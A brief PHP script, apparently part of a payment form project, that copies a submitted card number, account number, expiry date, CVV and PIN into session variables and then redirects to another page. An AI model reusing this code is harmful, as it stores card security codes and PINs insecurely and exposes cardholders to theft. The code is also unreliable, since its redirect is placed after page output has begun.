<?php
session_start();
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Untitled Document</title>
</head>
<?php

if(isset($_POST['proceed2']))
{
	$_SESSION["cardno"]=$_POST["cardno"];
    $_SESSION["accn"]=$_POST["accn"];
	$_SESSION["cardty"]=$_POST["cardty"];
    $_SESSION["edate"]=$_POST["edate1"]."/".$_POST["edate2"];
	$_SESSION["cvvno"]=$_POST["cvvno"];
    $_SESSION["pin"]=$_POST["pin"];
	
}
header('location:payment21_db2.php');
?>

<body>
</body>
</html>